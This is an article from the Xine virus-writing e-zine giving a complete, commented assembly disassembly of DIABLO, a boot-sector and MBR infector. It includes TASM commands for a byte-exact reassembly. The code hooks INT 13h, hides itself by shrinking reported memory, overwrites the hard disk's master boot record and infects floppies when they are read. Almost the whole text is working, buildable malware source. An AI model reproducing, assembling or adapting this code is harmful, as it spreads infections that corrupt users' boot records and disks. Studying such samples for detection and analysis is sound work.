; 
;                                         /-----------------------------\
;                                         | Xine - issue #4 - Phile 311 |
;                                         \-----------------------------/
; 
; Comment ¾
; 
;   V                    Û  ß           Û       Û
;    I                   Û  Û  ßßßßÜ    Û       Û  ÜßßßßÜ
;     R              ÜÜÜÜÛ  Û   ÜÜÜÛ    ÛÜÜÜÜ   Û  Û    Û
;      U            Û    Û  Û  Û   Û    Û    Û  Û  Û    Û
;       S           ßÜÜÜÜÛ  Û  ßÜÜÜÛÜÜÜ ÛÜÜÜÜß  Û  ßÜÜÜÜß
; 
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                       Disassembled by Int13h/IKX
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; 
;  DIABLO is a rather simple BS/MBR infector. This virus is in the wild in
;  Paraguay, then I decided to disassembly it, because I never published a
;  disassembly  and always there is a first time :) It fits in one sector.
;  You  can  get a byte-byte match re-assembly compiling it with TASM 4.0:
; 
;                         tasm /zi /m3 diablo
;                         tlink /v diablo
;                         tdstrip /c diablo
; 
; ¾

.model tiny
.code
org 0

DIABLO: jmp     Virus_Begin

; Here must go the disk parameter block

org 03eh

Virus_Begin:
        cli
        xor     ax,ax
        mov     ds,ax                   ; DS=IVT
        mov     ax,word ptr ds:[004ch]  ; AX=INT 13h's offset
        mov     cs:[07c00h+CD13Offs],ax
        mov     ax,word ptr ds:[004eh]  ; AX=INT 13h's segment
        mov     cs:[07c00h+CD13Segm],ax
        mov     ax,word ptr ds:[0412h]  ; AH = byte in 0:0x413
        mov     cx,ax
        mov     al,byte ptr ds:[0414h]  ; AL = the other byte in 0:0x414
        xchg    ah,al                   ; AX = total system memory in KBs
        sub     ax,0002                 ; Substract 2KB
        mov     ch,al
        mov     word ptr ds:[0412h],cx  ; Put the new amount of
        mov     byte ptr ds:[0414h],ah  ; memory, with 2KBs less
        mov     cl,06                   ; For the shifting left
        shl     ax,cl
        mov     es,ax                   ; ES = place for virus
        mov     word ptr ds:[004eh],ax  ; Change INT 13h's segment
        mov     ax,offset CD13Handler   ; New INT 13h's handler
        mov     word ptr ds:[004ch],ax  ; Change INT 13h's offset
        sti

        xor     di,di
        mov     bx,07c00h               ; Points to virus beginning
        mov     si,bx
        mov     cx,0100h
        push    ds
        push    bx
        cld
        repz    movsw                   ; Copy virus to ES:DI

        push    es
        mov     ax,offset ViralSegment
        push    ax
        retf                            ; Jmp to viral code at TOM

ViralSegment:
        push    ds                      ; Jumped!
        pop     es                      ; DS=ES=0
        cmp     word ptr cs:[0013h],0960h
        jnb     NonRETF
        retf                            ; jmp to 0:07c00

NonRETF:mov     dh,01                   ; Head 1
        mov     cx,000eh                ; Cylinder 0, sector 14

        cmp     byte ptr cs:[01b0h],00
        jz      Here

        mov     cx,0002                 ; Cylinder 0, sector 2
        mov     dh,00                   ; Head 0
Here:   mov     dl,cs:[01b0h]           ; Drive in dl
        mov     bx,07c00h               ; 7C00 to bx
        mov     ax,0201h                ; Read 1 sec
        int     13h
                                 
        push    cs cs                   ; ES=DS=CS
        pop     es ds

        mov     ax,0201h                ; Read 1 sector
        mov     cx,0001h                ; Cylinder 0, sector 1
        mov     dx,0080h                ; Head 0, drive C:
        mov     bx,0200h                ; Buffer below the virus
        int     13h

        mov     ax,cs:[0200h]
        cmp     cs:[0],ax               ; ¨Infected?
        jz      Identic
                               
        mov     ax,0301h                ; Write 1 sector
        mov     cx,0002h                ; Cylinder 0, sector 2
        mov     dx,0080h                ; Head 0, drive C:
        mov     bx,0200h                ; Buffer under virus
        int     13h
                                 
        mov     si,03beh                ; Copy floppy's stuph
        mov     di,01beh
        mov     cx,0021h
        repz    movsw

        mov     byte ptr cs:[01b0h],080h
        mov     ax,0301h                ; Write 1 sector
        mov     cx,0001h                ; Cylinder 0, sector 1
        mov     dx,0080h                ; Head 0, drive C:
        mov     bx,0                    ; XOR BX,BX/SUB BX,BX!
        int     13h

Identic:mov     byte ptr ds:[01b0h],0
        nop
        retf

CD13Handler:
        cmp     ah,02h                  ; Sector read?
        Jne     NonRead
        cmp     dl,0                    ; Drive A:?
        Jne     NonRead
        pushf                           ; Simulate the int
        call    dword Ptr cs:[CD13Offs] ; Call the real Inty

        pushf
        call    LetsCheck
        popf
        retf    2

NonRead:db      0eah
        CD13Offs  dw 0
        CD13Segm  dw 0

LetsCheck:
        push    ax bx cx dx ds es si di

        mov     ax,cs
        mov     es,ax
        mov     ds,ax
        mov     ax,0201h                ; Read 1 sector
        mov     cx,0001h                ; Cylinder 0, sector 1
        mov     dx,0000h                ; Head 0, drive A:
        mov     bx,0200h                ; Virus's buffer
        pushf
        call    dword Ptr cs:[CD13Offs]
        jnc     Okis
        jmp     EternoRetorno
        nop

Okis:   cmp     word ptr cs:[0213h],0960h
        Jb      EternoRetorno

        mov     si,01aah
        mov     di,03aah
        mov     cx,3
        repz    cmpsw                   ; Compare for DIABLO
        jnz     NonInfected
        jmp     EternoRetorno           ; Already infected
        nop

NonInfected:
        mov     ax,0301h                ; Write 1 sector
        mov     cx,000eh                ; Cylinder 0, sector 14
        mov     dx,0100h                ; Head 1, drive A:
        mov     bx,0200h                ; Buffer where the boot was read
        pushf
        call    dword ptr cs:[CD13Offs] ; Real inty
        jnc     AllOK

        jmp     EternoRetorno
        nop

AllOK:  xor     si,si
        mov     di,0200h
        mov     cx,3
        repz    movsb

        mov     si,003eh
        mov     di,023eh
        mov     cx,0173h
        repz    movsb

        mov     ax,0301h                ; Write 1 sector
        mov     cx,0001h                ; Cylinder 0, sector 1
        xor     dx,dx                   ; Head 0, drive A:
        mov     bx,0200h
        pushf                           ; Call the real inty
        call    dword ptr cs:[CD13Offs]

EternoRetorno:
        pop     di si es ds dx cx bx ax
        ret
                                        
        db      'DIABLO'                ; In spanish, diablo=devil

org 01feh
db  055h,0aah                           ; Boot mark
org 200h
End DIABLO



